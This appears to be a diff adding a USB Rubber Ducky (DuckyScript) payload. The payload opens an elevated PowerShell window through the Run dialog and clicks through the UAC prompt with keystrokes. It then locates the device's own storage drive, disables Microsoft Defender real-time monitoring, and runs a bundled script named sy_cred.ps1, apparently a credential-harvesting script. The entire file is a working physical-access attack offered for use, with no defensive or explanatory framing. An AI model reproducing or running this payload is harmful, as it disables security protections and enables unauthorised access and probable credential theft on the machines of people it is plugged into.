@@ -1,0 +1,19 @@
+ATTACKMODE HID STORAGE
+
+DEFINE #DUCKY_DRIVER_LABEL DUCKY
+DEFINE #PS1 sy_cred.ps1
+
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell 
+CONTROL SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 150
+ENTER
+DELAY 500
+STRINGLN $duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq '#DUCKY_DRIVER_LABEL' }).DeviceID;cd $duckletter
+STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true
+STRINGLN .\#PS1
+STRINGLN exit
